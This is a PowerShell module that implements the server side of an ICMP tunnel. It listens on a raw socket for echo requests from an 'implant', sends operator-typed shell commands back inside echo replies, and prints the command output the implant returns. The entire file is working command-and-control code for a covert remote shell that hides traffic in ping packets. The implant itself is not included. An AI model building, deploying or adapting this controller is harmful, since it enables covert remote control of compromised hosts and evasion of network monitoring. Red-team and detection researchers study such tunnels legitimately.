Import-Module ReadLineWithHistory;

enum ImplantMessageType {
	Prompt = 0
	NeedsInstruction = 1
	CommandResultPart = 2
	CommandResultEnd = 3
}

enum ServerMessageType {
	NeedsPrompt = 34
	IssuingCommand = 9
	Stop = 2
}

enum ServerState {
	WaitingForPrompt = 0
	EnteringCommand = 1
	WaitingToReplyWithCommand = 2
	ReceivingCommandResult = 3
}

<#
  .Description
  Binds to the specified IP address and listens for ICMP Tunnel packets from an ICMP Tunnel implant.
#>
function Start-ICMPTunnelServer {
	[CmdletBinding()]
	Param (
		[Parameter()]
		[Alias("IP")]
		[IPAddress]
		$IPAddress = "0.0.0.0",

		[Parameter()]
		[Int32]
		$BufferSize = 65535
	)

	If ($IsLinux) {
		If (-not ("LIBC" -as [type])) {
			Add-Type @'
using System;
using System.Runtime.InteropServices;

public static class LIBC
{
  [DllImport("libc.so.6")]
  public static extern uint geteuid();
}
'@;
		}
		If ([LIBC]::geteuid() -ne 0) {
			Write-Host "This program must be run as root to intercept ICMP packets.";
			Return;
		}
	}

	# Initialize socket and bind
	Try {
		$ICMPSocket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::ICMP);
	}
	Catch {
		If ($_.Exception.InnerException.ErrorCode -eq 13) {
			Write-Host "Permission to intercept ICMP packets was denied. Try again with root or admin permissions.";
			Return;
		}
	}
	$ICMPSocket.SetSocketOption([Net.Sockets.SocketOptionLevel]::Socket, [Net.Sockets.SocketOptionName]::ReceiveTimeout, 10);
	$Address = New-Object System.Net.IPEndPoint($IPAddress, 0);
	$ICMPSocket.Bind($Address);
	$ICMPSocket.Blocking = $False;

	[ServerState]$State = [ServerState]::WaitingForPrompt;

	function Receive-ICMPMessage {
		# .Description
		# Checks for an ICMP Echo Request from anyone and returns the ICMP header, ImplantMessageType, message data, and the IPEndpoint. 

		$Buffer = New-Object Byte[] ($BufferSize);
		$Endpoint = New-Object Net.IPEndpoint([Net.IPAddress]::Any, 0);
		$IPPacketInformation = New-Object Net.Sockets.IPPacketInformation;

		$ByteCount = 0;
		try {
			# Checking for an ICMP packet from any IP.
			$ByteCount = $ICMPSocket.ReceiveMessageFrom($Buffer, 0, $BufferSize, [ref][System.Net.Sockets.SocketFlags]::None, [ref]$Endpoint, [ref]$IPPacketInformation);
		}
		catch { return $null; }
		if ($ByteCount -eq 0) { return $null; }

		# Finding the end of the IP header and checking the ICMP type.
		$IPHeaderSize = ($Buffer[0] -band 0x0f) * 4;
		$ICMPType = $Buffer[$IPHeaderSize];
		if ($ICMPType -ne 8) { return $null; }

		# Stripping off the IP header.
		[Byte[]]$ICMPHeader = $Buffer[$IPHeaderSize..($IPHeaderSize + 7)];
		if ($ByteCount -lt $IPHeaderSize + 8) { return $null; }

		# Grabbing the ImplantMessageType and message data
		[ImplantMessageType]$MessageType = $Buffer[$IPHeaderSize + 8];
		$MessageData = if ($ByteCount -lt $IPHeaderSize + 9) { $null } else { $Buffer[($IPHeaderSize + 9)..($ByteCount - 1)] };

		return ($ICMPHeader, $MessageType, $MessageData, $Endpoint);
	}

	# .Description
	# Sends an ICMP Echo Reply to the specified IPEndpoint with the specified ServerMessageType and a command string if relevant.
	function Send-ICMPMessage {
		[CmdletBinding()]
		param (
			[Parameter(Mandatory)]
			[Byte[]]
			$ICMPHeader,

			[Parameter(Mandatory)]
			[Net.IPEndpoint]
			$Endpoint,

			[Parameter(Mandatory)]
			[ServerMessageType]
			$MessageType,

			[Parameter()]
			[Object]
			$Command
		)

		#Constructing the Echo Reply packet
		if ($null -eq $Command) { $Command = '' }
		$EchoReply = @(0, 0, 0, 0) + $ICMPHeader[4..7] + $MessageType + [Text.Encoding]::UTF8.GetBytes($Command);

		# Calculating the checksum of the Echo Reply (ones' complement of the ones' complement sum of every 16 bits)
		$Checksum = 0;
		for ($Index = 0; $Index -lt $EchoReply.Count; $Index += 2) {
			$Checksum += ([uint16]$EchoReply[$Index] -shl 8) -bor $EchoReply[$Index + 1];
			$Checksum = ($Checksum -band 0xFFFF) + ($Checksum -shr 16);
		}
		$Checksum = -bnot $Checksum -band 0xFFFF;
		$EchoReply[2] = $Checksum -shr 8;
		$EchoReply[3] = $Checksum -band 0xFF;

		# Sending the Echo Reply
		$ICMPSocket.SendTo($EchoReply, [System.Net.Sockets.SocketFlags]::None, $Endpoint) | Out-Null;
	}

	$CommandToSend = $null
	$Prompt = $null
	$Reader = New-ReadLineWithHistory;
	Write-Host "ICMP Tunnel Server started! Waiting for a connection..."
	while ($True) {
		Switch ($State) {
			WaitingForPrompt {
        ($ICMPHeader, $MessageType, $MessageData, $Endpoint) = Receive-ICMPMessage;
				if ($null -eq $ICMPHeader) { Continue; }

				# TODO: add check for sync message.

				Switch ([ImplantMessageType]$MessageType) {
					Prompt {
						$Prompt = [Text.Encoding]::UTF8.GetString($MessageData);
						$State = [ServerState]::EnteringCommand;
						Break;
					}
					NeedsInstruction {
						Send-ICMPMessage -ICMPHeader $ICMPHeader -Endpoint $Endpoint -MessageType NeedsPrompt;
						Break;
					}
				}
				Break;
			}
			EnteringCommand {
				$CommandToSend = $Reader.ReadLine($Prompt);
				$State = [ServerState]::WaitingToReplyWithCommand;
				Break;
			}
			WaitingToReplyWithCommand {
        ($ICMPHeader, $MessageType, $MessageData, $Endpoint) = Receive-ICMPMessage;
				if ($null -eq $ICMPHeader) { Continue; }

				Switch ($MessageType) {
					NeedsInstruction {
						Send-ICMPMessage -ICMPHeader $ICMPHeader -Endpoint $Endpoint -MessageType IssuingCommand -Command $CommandToSend;
						$State = [ServerState]::ReceivingCommandResult;
						Break;
					}
				}
				Break;
			}
			ReceivingCommandResult {
        ($ICMPHeader, $MessageType, $MessageData, $Endpoint) = Receive-ICMPMessage;
				if ($null -eq $ICMPHeader) { Continue; }

				Switch ($MessageType) {
					CommandResultPart {
						Write-Host -NoNewline ([Text.Encoding]::UTF8.GetString($MessageData));
						Break;
					}
					CommandResultEnd {
						Write-Host ([Text.Encoding]::UTF8.GetString($MessageData));
						$State = [ServerState]::WaitingForPrompt;
						Break;
					}
				}
				Break;
			}
		}
	}
}

Export-ModuleMember -Function Start-ICMPTunnelServer;
